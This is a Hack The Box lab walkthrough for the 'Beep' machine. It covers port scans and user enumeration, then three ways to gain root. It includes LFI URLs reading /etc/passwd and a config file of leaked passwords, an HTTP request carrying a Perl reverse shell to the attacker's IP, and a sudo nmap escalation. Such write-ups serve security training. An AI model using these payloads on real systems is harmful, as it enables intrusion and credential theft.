# Hackthebox Beep


Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

We perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Thu Oct  4 22:10:06 2018 as: nmap -v -sV -oA beep_tcp 10.10.10.7
Nmap scan report for 10.10.10.7
Host is up (0.039s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp?
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap?
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
Service Info: Host: 127.0.0.1
```

At he same time we start a more extensive scan scanning all tcp ports and services

```
# Nmap 7.70 scan initiated Thu Oct 18 21:41:22 2018 as: nmap -v -sV -p- -oA beep_full_tcp 10.10.10.7
Nmap scan report for 10.10.10.7
Host is up (0.033s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
745/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
```

The second scan revealed a couple of additional services. 

So here we have a lot of different potential vulnerable services. So where do we begin?

I usually start either at the highest port and work my way down, as most services listening on really high ports are usually vulnerable on HTB boxes, or I start at the lowest port. 
Regardless, I am trying to pinpoint the exact running version of the services and mapping them to known exploits.

We could run a vulnerability scan of all the open ports using either Nmap or something like Nessus.



Port 22(SSH) is not that interesting right know, what we could try to do is to enumerate some valid usernames, as some old versions of SSH are vulnerable to this attack.

The next port is 25 and we have a SMTP server listening on this port. One common issue with SMTP server is the we may be able to enumerate valid username using the VRFY command.

There are multiple script that do this, I chose one in the Metasploit framework.

```
msf auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.10.10.7:25         - 10.10.10.7:25 Banner: 220 beep.localdomain ESMTP Postfix
[+] 10.10.10.7:25         - 10.10.10.7:25 Users found: , adm, bin, daemon, fax, ftp, games, gdm, gopher, haldaemon, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


On port 8 and 443 there is a webserver listening. When vi visit the page we see an Elastix login page.

So one option we have is to try to bruteforce the login. After a couple of tries we notice that we are getting blocked. So there is a lockout mechanism in place.

So lets do some content discovery with Gobuster.

```
root@kali:~/htb/beep# gobuster -u https://10.10.10.7:443 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -k

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://10.10.10.7:443/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/11/01 21:56:09 Starting gobuster
=====================================================
/modules (Status: 301)
/images (Status: 301)
/admin (Status: 301)
/themes (Status: 301)
/help (Status: 301)
/var (Status: 301)
/mail (Status: 301)
/static (Status: 301)
/lang (Status: 301)
/libs (Status: 301)
/panel (Status: 301)
/configs (Status: 301)
/recordings (Status: 301)
/vtigercrm (Status: 301)
=====================================================
2018/11/01 22:13:06 Finished
=====================================================
```

These folders contains a lot of potential issues


https://10.10.10.7/ <--- Elastix login (version unknown)
https://10.10.10.7/mail/ <--- Roundcube webmail (version unknown)
https://10.10.10.7/admin/config.php <--- FreePBX 2.8.1.4 Administration
https://10.10.10.7/recordings/index.php <--- ﻿FreePBX 2.5 recoring
https://10.10.10.7/static/faxutils.htm < --- ﻿jhylafax-1.4.0-app?
https://10.10.10.7/vtigercrm/ <--- ﻿vtiger CRM 5.1.0 login


At port 10000 we have a Miniserv/webmin service with version 1.570. Checking exploitdb we find a RCE exploit for this version. The only problem is that we need to be authenticated.

So we have some initial enumeration and a lot of possible ways to exploit the box. So next I will be showing a couple of solutions.


## Solution #1 - Elastix 2.2.0 - 'graph.php' Local File Inclusion


Searching for exploits I find that Elastix version 2.2.0 is vulnerable to a Local File inclusion in the "/vtigercrm/graph.php" file. 

```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                      |  Path
                                                                                                                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Elastix - 'page' Cross-Site Scripting                                                                                                                               | exploits/php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                             | exploits/php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                       | exploits/php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                                    | exploits/php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                                                                                   | exploits/php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                                                                                  | exploits/php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                              | exploits/php/webapps/18650.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
```

In our enumeration of the webservice I found a directory https://10.10.10.7/vtigercrm/.

So this exploit may work on our target. 


```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

Visiting the above vulnerable URL we will get access to the AMportals configuration file.

In the file we find some creds.

```
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```

So now we have a couple of usernames and passwords that we can try against the targets SSH server. 

Using the "AMPMGRPASS" above with the root user we get admin access on the box.

```
root@kali:~/htb/beep# ssh root@10.10.10.7
root@10.10.10.7's password: 
Last login: Fri Aug 25 18:05:54 2017

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

## Solution #2 - vTiger CRM 5.1.0 - Local File Inclusion

There is another LFI vulnerability in the vtiger CMS, among other stuff. 

Output of known exploits on vTiger CMS.

```
root@kali:~/htb/beep# searchsploit vtiger
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                      |  Path
                                                                                                                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Vtiger - 'Install' Remote Command Execution (Metasploit)                                                                                                            | exploits/php/remote/32794.rb
Vtiger CRM 6.3.0 - (Authenticated) Arbitrary File Upload (Metasploit)                                                                                               | exploits/php/webapps/44379.rb
vTiger CRM 4.2 - 'calpath' Multiple Remote File Inclusions                                                                                                          | exploits/php/webapps/2508.txt
vTiger CRM 4.2 - SQL Injection                                                                                                                                      | exploits/php/webapps/26586.txt
vTiger CRM 4.2 Leads Module - 'record' Cross-Site Scripting                                                                                                         | exploits/php/webapps/26584.txt
vTiger CRM 4.2 RSS Aggregation Module - Feed Cross-Site Scripting                                                                                                   | exploits/php/webapps/26585.txt
vTiger CRM 5.0.4 - Local File Inclusion                                                                                                                             | exploits/php/webapps/16280.py
vTiger CRM 5.0.4 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                    | exploits/php/webapps/32307.txt
vTiger CRM 5.0.4 - Remote Code Execution / Cross-Site Request Forgery / Local File Inclusion / Cross-Site Scripting                                                 | exploits/php/webapps/9450.txt
vTiger CRM 5.1.0 - Local File Inclusion                                                                                                                             | exploits/php/webapps/18770.txt
vTiger CRM 5.2 - 'onlyforuser' SQL Injection                                                                                                                        | exploits/php/webapps/36208.txt
vTiger CRM 5.2.1 - 'PHPrint.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                      | exploits/php/webapps/36204.txt
vTiger CRM 5.2.1 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities (1)                                                                                    | exploits/php/webapps/36203.txt
vTiger CRM 5.2.1 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities (2)                                                                                    | exploits/php/webapps/36255.txt
vTiger CRM 5.2.1 - 'sortfieldsjson.php' Local File Inclusion                                                                                                        | exploits/php/webapps/35574.txt
vTiger CRM 5.2.1 - 'vtigerservice.php' Cross-Site Scripting                                                                                                         | exploits/php/webapps/35577.txt
vTiger CRM 5.3.0 5.4.0 - (Authenticated) Remote Code Execution (Metasploit)                                                                                         | exploits/php/remote/29319.rb
vTiger CRM 5.4.0 - 'index.php?onlyforuser' SQL Injection                                                                                                            | exploits/php/webapps/28409.txt
vTiger CRM 5.4.0 SOAP - AddEmailAttachment Arbitrary File Upload (Metasploit)                                                                                       | exploits/php/remote/30787.rb
vTiger CRM 5.4.0 SOAP - Multiple Vulnerabilities                                                                                                                    | exploits/php/webapps/27279.txt
vTiger CRM 5.4.0/6.0 RC/6.0.0 GA - 'browse.php' Local File Inclusion                                                                                                | exploits/php/webapps/32213.txt
vTiger CRM 6.3.0 - (Authenticated) Remote Code Execution                                                                                                            | exploits/php/webapps/38345.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

Getting the passwd file:

https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=/etc/passwd%00


Getting the AMPortal config:

https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/amportal.conf%00&module=Accounts&action

We can then just SSH into the box as root once again.


## Solution #3 - FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution

There is another exploit for Elastix version 2.2.0.

This exploit is available as a Metasploit module and a standalone python exploit. To be able to use this we need to know a valid extension.

To find valid extensions we can use a tool in the sipvicious suite, namly the svwar tool.

```
root@kali:~/htb/beep# svwar -m INVITE -e100-500 10.10.10.7
WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
| Extension | Authentication |
------------------------------
| 233       | reqauth        |
```

We found an externsion 233.

Now let's modify and try the python exploit.

The following lines in the exploit need to be modified:

```
rhost="10.10.10.7"
lhost="10.10.14.17"
lport=443
extension="233"
```

Running the exploit it throws some SSL errors on us, I tried to disable them and also port the exploit to using python requests but I still recieve the error. So Instead I redirect the traffic through burp and sen the exploit through.

```
GET /recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.6%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24~-%3efdopen%28%24c%2cw%29%3bsystem%24_%20while%3c%3e%3b%27%0D%0A%0D%0A&8081 HTTP/1.1
Host: 127.0.0.1
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.20.0
```

Catching the shell:

```
root@kali:~/htb/beep# nc -lvp 443
listening on [any] 443 ...
10.10.10.7: inverse host lookup failed: Unknown host
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.7] 40123
id
uid=100(asterisk) gid=101(asterisk)

python -c "import pty;pty.spawn('/bin/bash')"
bash-3.2$
```

The exploit mentioned a way to priv esc using sudo and nmap interactive on the target host. Let's try that

First let's verify that we can run nmap as root without a password:

```
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper

``` 

Next run nmap in interactive mode and spawn a root shell:

```
sh-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
sh-3.2# 
```
